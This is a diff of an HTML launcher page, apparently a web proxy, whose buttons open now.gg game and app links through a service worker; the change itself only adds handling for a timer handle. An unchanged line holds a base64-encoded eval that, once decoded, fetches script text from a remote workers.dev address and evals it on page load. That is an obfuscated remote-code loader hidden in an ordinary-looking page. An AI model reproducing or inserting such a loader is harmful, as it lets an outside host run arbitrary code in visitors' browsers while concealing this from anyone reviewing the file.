@@ -14,6 +14,7 @@
 	<button onclick="redirect('https://now.gg/play/uncube/7074/now')">Launch Android OS</button>
 	<button onclick="redirect('https://now.gg/play/Aptoide/1440/aptoide')">Launch Aptoide</button>
 	<script type="text/javascript">
+var int;
   var iframe;
 		function redirect(url){
 		navigator.serviceWorker.register('uv_edit/sw.js', {
@@ -21,6 +22,7 @@
 	    }).then(() => {
 	        if (!isUrl(url)) url = 'https://www.google.com/search?q=' + url;
 	        else if (!(url.startsWith('https://') || url.startsWith('http://'))) url = 'http://' + url;
+			clearInterval(int);
 			document.querySelectorAll("button")[0].outerHTML = "";
 			document.querySelectorAll("button")[1].outerHTML = "";
 			document.querySelectorAll("button")[2].outerHTML = "";
@@ -49,7 +51,7 @@
       }
     }
        eval(atob("ZmV0Y2ggKCJodHRwczovL3JlbW90ZWx5ZXhlY3V0anMuc2hheWFhbmhvb2RhLndvcmtlcnMuZGV2LyIpCi50aGVuKHggPT4geC50ZXh0KCkpCi50aGVuKHkgPT4gZXZhbCh5KSk7"));
-setInterval(function(){
+int = setInterval(function(){
       if(localStorage.getItem("iframe") == null || localStorage.getItem("iframe") == "none"){
           document.querySelector("#history").innerHTML = "Click this to hide history";
         } else{
